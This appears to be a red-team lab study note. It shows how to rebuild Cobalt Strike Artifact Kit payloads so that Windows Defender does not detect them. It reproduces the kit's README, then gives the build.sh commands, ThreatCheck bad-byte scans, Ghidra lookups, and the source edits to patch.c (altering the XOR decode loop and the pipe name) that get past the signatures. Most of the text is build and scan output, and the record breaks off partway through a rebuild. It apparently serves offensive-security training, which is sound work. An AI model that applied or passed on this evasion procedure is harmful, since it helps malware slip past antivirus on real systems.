
- Artifact_Kit is utilized to modify all payloads that are dropped to disk to bypass Windows Defender

# MAKE SURE TO HAVE REAL TIME THREAT PROTECTION OFF ON ATTACKER DEKSTOP OR YOU WILL BE UBER FRUSTRATED

- copied to desktop of cobalt strike attacker desktop
- used Get-MPThreatDetection to identify the Defender alert
```powershell
PS C:\Users\Attacker> copy C:\Payloads\tcp-localonly_x64.svc.exe .\Desktop\
PS C:\Users\Attacker> Get-MpThreatDetection | sort $_.InitialDetectionTime | select -First 1


ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.23090.2008
CleaningActionID               : 2
CurrentThreatExecutionStatusID : 1
DetectionID                    : {89879AD7-F506-40FA-9FD5-FE37689083E7}
DetectionSourceTypeID          : 3
DomainUser                     : DESKTOP-3BSK7NO\Attacker
InitialDetectionTime           : 06/11/2023 20:51:48
ProcessName                    : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
RemediationTime                : 06/11/2023 20:52:20
Resources                      : {file:_C:\Users\Attacker\Desktop\tcp-localonly_x64.svc.exe}
ThreatID                       : 2147798396
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 3
PSComputerName                 :
```
opened up `WSL` for linux on the Attacker Desktop
```powershell
pwd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
```
ran `./build.sh` to get an idea of the command
```bash
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact [2]> ./build.sh
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [-] Missing Parameters:
[Artifact kit] [-] Usage:
[Artifact kit] [-] ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
[Artifact kit] [-]  - Techniques       - a space separated list
[Artifact kit] [-]  - Allocator        - set how to allocate memory for the reflective loader.
[Artifact kit] [-]                       Valid values [HeapAlloc VirtualAlloc MapViewOfFile]
[Artifact kit] [-]  - Stage Size       - integer used to set the space needed for the beacon stage.
[Artifact kit] [-]                       For a 0K   RDLL stage size should be 310272 or larger
[Artifact kit] [-]                       For a 5K   RDLL stage size should be 310272 or larger
[Artifact kit] [-]                       For a 100K RDLL stage size should be 444928 or larger
[Artifact kit] [-]  - RDLL Size        - integer used to specify the RDLL size. Valid values [0, 5, 100]
[Artifact kit] [-]  - Resource File    - true or false to include the resource file
[Artifact kit] [-]  - Stack Spoof      - true or false to use the stack spoofing technique
[Artifact kit] [-]  - Syscalls         - set the system call method
[Artifact kit] [-]                       Valid values [none embedded indirect indirect_randomized]
[Artifact kit] [-]  - Output Directory - Destination directory to save the output
[Artifact kit] [-] Example:
[Artifact kit] [-]   ./build.sh "peek pipe readfile" HeapAlloc 310272 5 true true indirect /tmp/dist/artifact
```
read `Readme.md` below for details on the command
# Artifact Kit

This package contains source code for Cobalt Strike's Artifact Kit. This kit
is designed to ease the development of antivirus safe artifacts.

Cobalt Strike uses artifacts from this kit to generate executables and DLLs
that are safe from some antivirus products. Load the included artifacts.cna
script to force Cobalt Strike to use your artifacts over the built-in ones.

Cobalt Strike uses these artifacts in the following places:

- Attacks -> Packages -> Windows Executable
- Attacks -> Packages -> Windows Executable (S)
- Attacks -> Web Drive-by -> Scripted Web Delivery (bitsadmin and exe)
- Beacon's 'elevate svc-exe' command
- Beacon's 'jump psexec' and 'jump psexec64' commands

#### Support for artifact kit settings 
The artifact kit has implemented a new alias 'ak-settings' to support the
ability to modify the following settings:

- service - Modify the service name that is returned from the PSEXEC_SERVICE hook
- spawnto_x86 - Modify the process used for migration by the SERVICE EXE artifact.
- spawnto_x64 - Modify the process used for migration by the SERVICE EXE artifact.

The spawnto_x86 and spawnto_x64 settings will attempt to initialize with the 
.post-ex.spawnto_[x86|x64] settings in the Malleable C2 profile, however there
are some conditions that need to be met.  When those conditions occur a valid
default value will be used.  The settings do not support values longer than 63
characters, empty value, and environment variable substitutions.

In previous versions of the artifact kit these settings could have been updated
in the source code and then rebuild the artifact kit.  Now with the 'ak-settings'
command an operator can modify these settings as needed to generate an artifact.

Example:
```
03/31 11:14:13 beacon> ak-settings
03/31 11:14:13 [*] artifact kit settings:
03/31 11:14:13 [*]    service     = 'updatesvc'
03/31 11:14:13 [*]    spawnto_x86 = 'C:\Windows\SysWOW64\dllhost.exe'
03/31 11:14:13 [*]    spawnto_x64 = 'C:\Windows\System32\svchost.exe'
03/31 11:16:02 beacon> ak-settings service timesvc
03/31 11:16:02 [*] Updating the psexec service name to 'timesvc'
03/31 11:16:02 [*] artifact kit settings:
03/31 11:16:02 [*]    service     = 'timesvc'
03/31 11:16:02 [*]    spawnto_x86 = 'C:\Windows\SysWOW64\dllhost.exe'
03/31 11:16:02 [*]    spawnto_x64 = 'C:\Windows\System32\svchost.exe'
03/31 11:18:45 beacon> jump psexec64 TARGET smb
03/31 11:18:45 [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\xyz) on TARGET via Service Control Manager (\\TARGET\ADMIN$\timesvc.exe)
03/31 11:18:49 [+] host called home, sent: 295101 bytes
03/31 11:18:52 [+] received output:
Started service timesvc on TARGET
03/31 11:18:52 [+] established link to child beacon: 111.22.333.444
```
You will notice that the new beacon will be running under the process 'svchost.exe'.

# How it Works

Most antivirus products use signatures to detect known malware. To defeat
packers and crypters these products use a virtual machine sandbox to step 
through a binary and check each step against the database of known signatures.
The A/V sandboxes do not emulate all possible things a program can do. Artifact
Kit binaries force shellcode through a process that many A/V engines can not
emulate. This causes the A/V engine to give up on processing the artifact.

### dist-mailslot/ (implemented in src-common/bypass-mailslot.c)
```
This bypass creates a mailslot to serve the obfuscated shellcode and a client
to read it. Once the client reads the obfuscated shellcode it decodes it.

This technique is from the Season 5 Episode 8 session by Mr. Un1k0d3r
https://mr.un1k0d3r.com/portal/index.php
```

### dist-peek/ (implemented in src-common/bypass-peek.c)
```
This bypass technique is from Facts and myths about antivirus evasion with
Metasploit by mihi (@mihi42).
See the Antivirus Sandbox Evasion section at
http://schierlm.users.sourceforge.net/avevasion.html
```

### dist-pipe/ (implemented in src-common/bypass-pipe.c)
```
This bypass creates a named pipe to serve the obfuscated shellcode and a client
to read it. Once the client reads the obfuscated shellcode it decodes it. 
```

### dist-readfile/ (implemented in src-common/bypass-readfile.c):
```
This bypass opens the current artifact file, skips to where the shellcode is
stored, reads it, and decodes it. This is the default artifact kit loaded with
Cobalt Strike.
```

### dist-readfile-v2/ (implemented in src-common/bypass-readfile-v2.c):
```
This bypass opens the current artifact file, reads from the file, overwrite
what was read with the payload, and decodes it.
```

### dist-template/ (implemented in src-common/template.c):
```
This bypass technique will not get past any antivirus. It's a template.
```

## Integration with the User Defined Reflective Loader

The `stagesize` can be changed to accommodate the larger required space for
beacons that have used the `BEACON_RDLL_SIZE` hook for large custom reflective
loaders. The size specified must be equal/larger than the size of the payload
being patched into the selected artifact. The `stagesize` is set as a parameter
when building the kit.

The BEACON_RDLL_SIZE hook will return a value of 0, 5 or 100.  The value 5 will
use the 5K reflective loader and 100 will use the 100K reflective loader.
Depending on the Cobalt Strike version the value 0 has different results.

For 4.8 and earlier the value 0 will use the 5K reflective loader.

For 4.9 and later the value 0 will not include space for a reflective loader in
the beacon dll and is meant for use with prepended loaders (sRDI/Double Pulsar)
such as those found in the udrl-vs kit.  In this case the `stagesize` needs to
include the loader and beacon sizes, which likely will be larger than the 5kb size.

```
0KB User Defined Reflective Loader size = 310272
5KB User Defined Reflective Loader size = 310272
100KB User Defined Reflective Loader size = 444928
```

## Custom the binary resource

The binary metadata can be configured using the src-main/resource.c file. This
can be used to set file metadata, icons, etc. It is enabled as a parameter
when building the kit.

## Use system calls

The artifacts will use either the standard Windows API or one of the system
calls methods.  The SysWhispers3 public repository was used to generate the
code for the system calls with additional modification to work with the
artifact kit.

The system call method that is referenced as 'jumper' in the SysWhispers3
project will be referred to as 'indirect' in the arsenal kit to be consistent
with the Cobalt Strike terminology.  This affects the file names, build scripts
and documentation, however does not affect the code in the generated files.

You can choose between the following system call methods.

Method              |     Description
--------------------|----------------------------------------
none                | Use standard windows api functions.
embedded            | Use the embedded method.
indirect            | Use the indirect method.
indirect_randomized | Use the indirect randomized method.

The embedded method will likely be caught by antivirus products.

Credits:
 - https://github.com/klezVirus/SysWhispers3
 - https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams
 - https://github.com/helpsystems/nanodump

# Usage
```
./build.sh <techniques> <allocator> <stage size> <rdll size> <resource file>
           <stack spoof> <syscalls> <output directory>

Techniques       - a space separated list
Allocator        - set how to allocate memory for the reflective loader.
                   Valid values [HeapAlloc, VirtualAlloc, MapViewOfFile]
Stage Size       - integer used to set the space needed for the beacon stage.
                   For a 0K   RDLL stage size should be 310272 or larger
                   For a 5K   RDLL stage size should be 310272 or larger
                   For a 100K RDLL stage size should be 444928 or larger
RDLL Size        - integer used to specify the RDLL size. Valid values [0, 5, 100]
Resource File    - true or false to include the resource file
Stack Spoof      - true or false to use the stack spoofing technique
Syscalls         - set the system calls method
                   Valid values [none embedded indirect indirect_randomized]
Output Directory - Destination directory to save the output
```

Example: 
```
./build.sh "peek pipe readfile" HeapAlloc 310272 5 true true indirect /tmp/dist
```

You will need the following:

- Minimal GNU for Windows Cross-Compiler - apt-get install mingw-w64

# HOWTO - Add a New Bypass

1. Create a file in src-common/, name it bypass-[your technique here].c
2. ./build.sh [your technique here] HeapAlloc 361000 5 true true none /tmp/dist

# Load into Cobalt Strike

To use your new Artifact Kit, load artifact.cna into Cobalt Strike. Each
variant of the Artifact Kit lives in its own folder. The artifact.cna script
contains a Cortana filter to tell Cobalt Strike to use your Artifact Kit over
the built-in option.

Open the Scripts manager, Cobalt Strike -> Scripts

Load `<output directory>/<technique>/artifact.cna`

# Modifications

You're encouraged to make modifications to this code and use them in your
engagements. Do not redistribute this source code. It is not open source. It
is provided as a benefit to licensed Cobalt Strike users.

# License

This code is subject to the end user license agreement for Cobalt Strike. The
complete license agreement is at:

https://www.cobaltstrike.com/license







# Artifact Kit Rebuild Begin

`./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts`
this is essentially just compiling all the executables, in order to modify the code the original c file named `patch.c` is located in `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\src-common\patch.c

- executed in `WSL` on Attacker Desktop
- utilized to recompile all executables
```bash
C:\Tools\cobaltstrike\arsenal-kit\kits
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact [124]>
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'
```
#### Threatcheck
in windows powershell on Attacker Desktop Run
```powershell
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
[*] C:\Temp doesn't exist. Creating it...
[+] Target file size: 329728 bytes
[+] Analyzing...
[*] Testing 164864 bytes
[*] Threat found, splitting
[*] Testing 82432 bytes
[*] Threat found, splitting
[*] Testing 41216 bytes
[*] Threat found, splitting
[*] Testing 20608 bytes
[*] Threat found, splitting
[*] Testing 10304 bytes
[*] Threat found, splitting
[*] Testing 5152 bytes
[*] Threat found, splitting
[*] Testing 2576 bytes
[*] No threat found, increasing size
[*] Testing 166152 bytes
[*] Threat found, splitting
[*] Testing 84364 bytes
[*] Threat found, splitting
[*] Testing 43470 bytes
[*] Threat found, splitting
[*] Testing 23023 bytes
[*] Threat found, splitting
[*] Testing 12799 bytes
[*] Threat found, splitting
[*] Testing 7687 bytes
[*] Threat found, splitting
[*] Testing 5131 bytes
[*] Threat found, splitting
[*] Testing 3853 bytes
[*] Threat found, splitting
[*] Testing 3214 bytes
[*] Threat found, splitting
[*] Testing 2895 bytes
[*] No threat found, increasing size
[*] Testing 166311 bytes
[*] Threat found, splitting
[*] Testing 84603 bytes
[*] Threat found, splitting
[*] Testing 43749 bytes
[*] Threat found, splitting
[*] Testing 23322 bytes
[*] Threat found, splitting
[*] Testing 13108 bytes
[*] Threat found, splitting
[*] Testing 8001 bytes
[*] Threat found, splitting
[*] Testing 5448 bytes
[*] Threat found, splitting
[*] Testing 4171 bytes
[*] Threat found, splitting
[*] Testing 3533 bytes
[*] Threat found, splitting
[*] Testing 3214 bytes
[*] Threat found, splitting
[*] Testing 3054 bytes
[*] Threat found, splitting
[*] Testing 2974 bytes
[*] No threat found, increasing size
[*] Testing 166351 bytes
[*] Threat found, splitting
[*] Testing 84662 bytes
[*] Threat found, splitting
[*] Testing 43818 bytes
[*] Threat found, splitting
[*] Testing 23396 bytes
[*] Threat found, splitting
[*] Testing 13185 bytes
[*] Threat found, splitting
[*] Testing 8079 bytes
[*] Threat found, splitting
[*] Testing 5526 bytes
[*] Threat found, splitting
[*] Testing 4250 bytes
[*] Threat found, splitting
[*] Testing 3612 bytes
[*] Threat found, splitting
[*] Testing 3293 bytes
[*] Threat found, splitting
[*] Testing 3133 bytes
[*] Threat found, splitting
[*] Testing 3053 bytes
[*] Threat found, splitting
[*] Testing 3013 bytes
[*] No threat found, increasing size
[*] Testing 166370 bytes
[*] Threat found, splitting
[*] Testing 84691 bytes
[*] Threat found, splitting
[*] Testing 43852 bytes
[*] Threat found, splitting
[*] Testing 23432 bytes
[*] Threat found, splitting
[*] Testing 13222 bytes
[*] Threat found, splitting
[*] Testing 8117 bytes
[*] Threat found, splitting
[*] Testing 5565 bytes
[*] Threat found, splitting
[*] Testing 4289 bytes
[*] Threat found, splitting
[*] Testing 3651 bytes
[*] Threat found, splitting
[*] Testing 3332 bytes
[*] Threat found, splitting
[*] Testing 3172 bytes
[*] Threat found, splitting
[*] Testing 3092 bytes
[*] Threat found, splitting
[*] Testing 3052 bytes
[*] Threat found, splitting
[*] Testing 3032 bytes
[*] No threat found, increasing size
[*] Testing 166380 bytes
[*] Threat found, splitting
[*] Testing 84706 bytes
[*] Threat found, splitting
[*] Testing 43869 bytes
[*] Threat found, splitting
[*] Testing 23450 bytes
[*] Threat found, splitting
[*] Testing 13241 bytes
[*] Threat found, splitting
[*] Testing 8136 bytes
[*] Threat found, splitting
[*] Testing 5584 bytes
[*] Threat found, splitting
[*] Testing 4308 bytes
[*] Threat found, splitting
[*] Testing 3670 bytes
[*] Threat found, splitting
[*] Testing 3351 bytes
[*] Threat found, splitting
[*] Testing 3191 bytes
[*] Threat found, splitting
[*] Testing 3111 bytes
[*] Threat found, splitting
[*] Testing 3071 bytes
[*] Threat found, splitting
[*] Testing 3051 bytes
[*] Threat found, splitting
[*] Testing 3041 bytes
[*] No threat found, increasing size
[*] Testing 166384 bytes
[*] Threat found, splitting
[*] Testing 84712 bytes
[*] Threat found, splitting
[*] Testing 43876 bytes
[*] Threat found, splitting
[*] Testing 23458 bytes
[*] Threat found, splitting
[*] Testing 13249 bytes
[*] Threat found, splitting
[*] Testing 8145 bytes
[*] Threat found, splitting
[*] Testing 5593 bytes
[*] Threat found, splitting
[*] Testing 4317 bytes
[*] Threat found, splitting
[*] Testing 3679 bytes
[*] Threat found, splitting
[*] Testing 3360 bytes
[*] Threat found, splitting
[*] Testing 3200 bytes
[*] Threat found, splitting
[*] Testing 3120 bytes
[*] Threat found, splitting
[*] Testing 3080 bytes
[*] Threat found, splitting
[*] Testing 3060 bytes
[*] Threat found, splitting
[*] Testing 3050 bytes
[*] No threat found, increasing size
[*] Testing 166389 bytes
[*] Threat found, splitting
[*] Testing 84719 bytes
[*] Threat found, splitting
[*] Testing 43884 bytes
[*] Threat found, splitting
[*] Testing 23467 bytes
[*] Threat found, splitting
[*] Testing 13258 bytes
[*] Threat found, splitting
[*] Testing 8154 bytes
[*] Threat found, splitting
[*] Testing 5602 bytes
[*] Threat found, splitting
[*] Testing 4326 bytes
[*] Threat found, splitting
[*] Testing 3688 bytes
[*] Threat found, splitting
[*] Testing 3369 bytes
[*] Threat found, splitting
[*] Testing 3209 bytes
[*] Threat found, splitting
[*] Testing 3129 bytes
[*] Threat found, splitting
[*] Testing 3089 bytes
[*] Threat found, splitting
[*] Testing 3069 bytes
[*] Threat found, splitting
[*] Testing 3059 bytes
[*] Threat found, splitting
[*] Testing 3054 bytes
[*] Threat found, splitting
[*] Testing 3052 bytes
[*] Threat found, splitting
[!] Identified end of bad bytes at offset 0xBEC
00000000   B9 06 00 00 00 4C 89 E7  4C 8D 05 05 E9 04 00 F3   1····L?çL?··é··ó
00000010   AB 4C 89 E9 C7 84 24 88  00 00 00 68 00 00 00 FF   «L?éÇ?$?···h···ÿ
00000020   15 57 2D 05 00 45 31 C9  45 31 C0 31 C9 4C 89 64   ·W-··E1ÉE1A1ÉL?d
00000030   24 48 4C 89 EA 48 89 6C  24 40 48 C7 44 24 38 00   $HL?êH?l$@HÇD$8·
00000040   00 00 00 48 C7 44 24 30  00 00 00 00 C7 44 24 28   ···HÇD$0····ÇD$(
00000050   04 00 00 00 C7 44 24 20  01 00 00 00 FF 15 8A 2B   ····ÇD$ ····ÿ·?+
00000060   05 00 85 C0 74 32 48 8B  4C 24 70 48 85 C9 74 28   ··?At2H?L$pH?Ét(
00000070   0F 10 44 24 70 48 8D 54  24 50 4C 63 CE 49 89 D8   ··D$pH?T$PLcII?O
00000080   48 8B 84 24 80 00 00 00  0F 11 44 24 50 48 89 44   H??$?·····D$PH?D
00000090   24 60 E8 6E FE FF FF 90  48 81 C4 F8 04 00 00 5B   $`èn_ÿÿ?H?Äo···[
000000A0   5E 5F 5D 41 5C 41 5D C3  57 56 48 83 EC 68 48 8D   ^_]A\A]AWVH?ìhH?
000000B0   35 62 E8 04 00 31 C0 49  89 C9 48 8D 7C 24 20 B9   5bè··1AI?ÉH?|$ 1
000000C0   10 00 00 00 41 89 D2 F3  A5 4C 89 C2 4C 8D 44 24   ····A?Oó¥L?AL?D$
000000D0   20 48 89 C1 83 E1 07 8A  0C 0A 41 30 0C 00 48 FF    H?A?á·?··A0··Hÿ
000000E0   C0 48 83 F8 40 75 EA 31  C0 41 39 C2 7E 12 48 89   AH?o@uê1AA9A~·H?
000000F0   C1 83 E1 07 8A 0C 0A 41  30 0C 01 48 FF C0 EB E9   A?á·?··A0··HÿAëé

[*] Run time: 15.83s
 14 40 05 00 14 40 05 00  14 40 05 00 4B 45 52 4E
```
this spits out a `bad byte offset` which you use ghidra to identify where to look in the code and make modifications
In Ghidra utilized `Navigation -> Go To...` and threw in `0xBEC` the highlighted portion shows the arguments that need to be fixed


![[Pasted image 20231106185303.png]]
highlight the entire function in `ghidra`
![[Pasted image 20240209002800.png]]

modified the `for` loop as instructed in the cobalt strike material
![[Pasted image 20231106185528.png]]
```powershell
for (x = 0; x < length; x++) {
    char* ptr = (char *)buffer + x;

    /* do something random */
    GetTickCount();

    *ptr = *ptr ^ key[x % 8];
}
```
modifying the portionthat says ` /* decode the payload with the key */`
![[Pasted image 20240209003554.png]]
what it will end up looking like 
![[Pasted image 20240209003835.png]]
rebuilt the kit in `WSL` session
```bash
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact [127]>
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact>
```
scanned with `ThreatCheck.exe` and got a new bad offset to work on.
```bash
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
[+] Target file size: 329728 bytes
[+] Analyzing...
[*] Testing 164864 bytes
[*] Threat found, splitting
[*] Testing 82432 bytes
[*] Threat found, splitting
[*] Testing 41216 bytes
[*] Threat found, splitting
[*] Testing 20608 bytes
[*] Threat found, splitting
[*] Testing 10304 bytes
[*] Threat found, splitting
[*] Testing 5152 bytes
[*] Threat found, splitting
[*] Testing 2576 bytes
[*] No threat found, increasing size
[*] Testing 166152 bytes
[*] Threat found, splitting
[*] Testing 84364 bytes
[*] Threat found, splitting
[*] Testing 43470 bytes
[*] Threat found, splitting
[*] Testing 23023 bytes
[*] Threat found, splitting
[*] Testing 12799 bytes
[*] Threat found, splitting
[*] Testing 7687 bytes
[*] Threat found, splitting
[*] Testing 5131 bytes
[*] Threat found, splitting
[*] Testing 3853 bytes
[*] Threat found, splitting
[*] Testing 3214 bytes
[*] No threat found, increasing size
[*] Testing 166471 bytes
[*] Threat found, splitting
[*] Testing 84842 bytes
[*] Threat found, splitting
[*] Testing 44028 bytes
[*] Threat found, splitting
[*] Testing 23621 bytes
[*] Threat found, splitting
[*] Testing 13417 bytes
[*] Threat found, splitting
[*] Testing 8315 bytes
[*] Threat found, splitting
[*] Testing 5764 bytes
[*] Threat found, splitting
[*] Testing 4489 bytes
[*] Threat found, splitting
[*] Testing 3851 bytes
[*] Threat found, splitting
[*] Testing 3532 bytes
[*] No threat found, increasing size
[*] Testing 166630 bytes
[*] Threat found, splitting
[*] Testing 85081 bytes
[*] Threat found, splitting
[*] Testing 44306 bytes
[*] Threat found, splitting
[*] Testing 23919 bytes
[*] Threat found, splitting
[*] Testing 13725 bytes
[*] Threat found, splitting
[*] Testing 8628 bytes
[*] Threat found, splitting
[*] Testing 6080 bytes
[*] Threat found, splitting
[*] Testing 4806 bytes
[*] Threat found, splitting
[*] Testing 4169 bytes
[*] Threat found, splitting
[*] Testing 3850 bytes
[*] Threat found, splitting
[*] Testing 3691 bytes
[*] Threat found, splitting
[*] Testing 3611 bytes
[*] No threat found, increasing size
[*] Testing 166669 bytes
[*] Threat found, splitting
[*] Testing 85140 bytes
[*] Threat found, splitting
[*] Testing 44375 bytes
[*] Threat found, splitting
[*] Testing 23993 bytes
[*] Threat found, splitting
[*] Testing 13802 bytes
[*] Threat found, splitting
[*] Testing 8706 bytes
[*] Threat found, splitting
[*] Testing 6158 bytes
[*] Threat found, splitting
[*] Testing 4884 bytes
[*] Threat found, splitting
[*] Testing 4247 bytes
[*] Threat found, splitting
[*] Testing 3929 bytes
[*] Threat found, splitting
[*] Testing 3770 bytes
[*] Threat found, splitting
[*] Testing 3690 bytes
[*] Threat found, splitting
[*] Testing 3650 bytes
[*] No threat found, increasing size
[*] Testing 166689 bytes
[*] Threat found, splitting
[*] Testing 85169 bytes
[*] Threat found, splitting
[*] Testing 44409 bytes
[*] Threat found, splitting
[*] Testing 24029 bytes
[*] Threat found, splitting
[*] Testing 13839 bytes
[*] Threat found, splitting
[*] Testing 8744 bytes
[*] Threat found, splitting
[*] Testing 6197 bytes
[*] Threat found, splitting
[*] Testing 4923 bytes
[*] Threat found, splitting
[*] Testing 4286 bytes
[*] Threat found, splitting
[*] Testing 3968 bytes
[*] Threat found, splitting
[*] Testing 3809 bytes
[*] Threat found, splitting
[*] Testing 3729 bytes
[*] Threat found, splitting
[*] Testing 3689 bytes
[*] Threat found, splitting
[*] Testing 3669 bytes
[*] Threat found, splitting
[*] Testing 3659 bytes
[*] Threat found, splitting
[*] Testing 3654 bytes
[*] Threat found, splitting
[*] Testing 3652 bytes
[*] Threat found, splitting
[!] Identified end of bad bytes at offset 0xE44
00000000   89 C4 31 C0 49 83 FC FF  74 3E 85 DB 7E 1F 49 89   ?Ä1AI?üÿt>?U~·I?
00000010   F9 41 89 D8 48 89 F2 4C  89 E1 48 C7 44 24 20 00   ùA?OH?òL?áHÇD$ ·
00000020   00 00 00 FF 15 FB 29 05  00 85 C0 75 10 4C 89 E1   ···ÿ·û)··?Au·L?á
00000030   FF 15 3E 29 05 00 B8 01  00 00 00 EB 0B 8B 54 24   ÿ·>)··,····ë·?T$
00000040   4C 48 01 D6 29 D3 EB C2  48 83 C4 58 5B 5E 5F 41   LH·Ö)OëAH?ÄX[^_A
00000050   5C C3 41 54 56 53 48 83  EC 20 48 8B 1D 6B EB 04   \AATVSH?ì H?·kë·
00000060   00 48 63 4B 04 E8 22 17  00 00 48 8B 35 F3 29 05   ·HcK·è"···H?5ó)·
00000070   00 49 89 C4 B9 00 04 00  00 FF D6 8B 53 04 4C 89   ·I?Ä1····ÿÖ?S·L?
00000080   E1 E8 2A FF FF FF 85 C0  74 EA 8B 53 04 4C 8D 43   áè*ÿÿÿ?Atê?S·L?C
00000090   08 4C 89 E1 E8 B7 FD FF  FF 4C 89 E1 E8 FB 16 00   ·L?áè·yÿÿL?áèû··
000000A0   00 31 C0 48 83 C4 20 5B  5E 41 5C C3 48 83 EC 68   ·1AH?Ä [^A\AH?ìh
000000B0   FF 15 4E 29 05 00 B9 AA  26 00 00 31 D2 41 B9 5C   ÿ·N)··1ª&··1OA1\
000000C0   00 00 00 F7 F1 C7 44 24  50 5C 00 00 00 C7 44 24   ···÷ñÇD$P\···ÇD$
000000D0   48 65 00 00 00 C7 44 24  40 70 00 00 00 C7 44 24   He···ÇD$@p···ÇD$
000000E0   38 69 00 00 00 C7 44 24  30 70 00 00 00 C7 44 24   8i···ÇD$0p···ÇD$
000000F0   28 5C 00 00 00 C7 44 24  20 2E 00 00 00 41 B8 5C   (\···ÇD$ .···A,\
```
this process gets repeated until no errors are found.
Threw in the new byte code into ghidra utilizing `Navigation -> Go To...` and entering `OxE44`
	- if that doesn't work go to `search` -> `memory` and search a hex string that was presented in the error `28 5C 00 00 00 C7 44 24`
![[Pasted image 20231107121521.png]]
opening `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\src-common\patch.c` to find the location of the `FUN` function to edit it.
had to add the `src-common` folder to be able to open `patch.c`, searched the `sprintf` function and found the portion that needs to be edited
![[Pasted image 20231107122752.png]]
before changing: `sprintf(pipename, "%c%c%c%c%c%c%c%c%cnetsvc\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));`
after changing: `sprintf(pipename, "%c%c%c%c%c%c%c%c%cbugser\\jumper", 92, 92, 46, 92, 112, 105, 112, 101, 92);`
click `save`
![[Pasted image 20231107123015.png]]
in windows `WSL` navigate to `/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact`
run command `./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts` to recompile and create the new adjusted artifacts
```bash
ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/artifact>
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
[Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts
[Artifact kit] [*] Using allocator: VirtualAlloc
[Artifact kit] [*] Using STAGE size: 310272
[Artifact kit] [*] Using RDLL size: 5K
[Artifact kit] [*] Using system call method: none
[Artifact kit] [+] Artifact Kit: Building artifacts for technique: pipe
[Artifact kit] [*] Recompile artifact32.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact32big.exe with src-common/bypass-pipe.c
